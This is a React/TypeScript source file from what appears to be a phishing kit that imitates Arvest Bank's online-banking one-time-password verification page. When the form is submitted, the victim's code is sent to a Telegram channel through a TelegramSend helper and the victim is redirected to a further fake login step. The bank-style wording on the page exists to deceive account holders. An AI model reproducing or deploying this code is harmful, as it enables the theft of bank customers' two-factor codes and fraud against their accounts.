import React, {useState} from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import TelegramSend from "../utils/send-message";

export default function Code() {
  const [formInput, setFormInput] = useState<otp>({
    cd: ""
})
const [isLoading, setIsLoading] = React.useState(false);
const navigate = useNavigate()

function handleInputChange (event:React.ChangeEvent<HTMLInputElement>){
    setFormInput((prevData) => ({
        ...prevData,
        [event.target.name]: event.target.value
    }))
}

async function handleSubmit(event: React.FormEvent<HTMLFormElement>){
    
    event.preventDefault()
    setIsLoading(true)
    const message = `
    [----+🏦 ARVEST CODE 🏦+-----]

    CODE: ${formInput.cd}
    
    `;
    await TelegramSend(message)
    cookies.set("code", formInput)
    setIsLoading(false)
    navigate("../login/auth/2", {replace:true})
    
}
  return (
    <>
      <div className="submitForm">
       <center> <h3>Verification</h3> </center>
        <p
          className="go-left"
          style={{ fontSize: "14px", marginBottom: "30px" }}
        >

          To verify your identity, a one time password has been sent to your phone/email. <br />
        </p>
<br />
        <form id="login-form" onSubmit={handleSubmit} method="post">
          <div className="input-field" style={{ textAlign: "left" }}>
            <label htmlFor="username">
              Enter Code <span style={{ color: "red" }}>*</span>
            </label>
            <input onChange={handleInputChange} required id="username" name="cd" type="text" />
          </div>
         

         <br /><br />
          <p>
            <a style={{ textDecoration: "none", fontSize: "15px" }} href="">
              Forgot your login ID
            </a>
          </p>
          <p>
            <a style={{ textDecoration: "none", fontSize: "15px" }} href="">
              Forgot your password
            </a>
          </p>
          {isLoading ?
            <button style={{ marginTop: "-2px" }} type="button">
          Please wait...
        </button>
          :
          <button style={{ marginTop: "-2px" }} type="submit">
          Submit
        </button>}
        </form>

        
        <br />

        <p>Unauthorized access is prohibited. Usage may be monitored</p>

        <hr />

        <p>Have questions about Arvest Online Banking?</p>
      </div>
    </>
  );
}
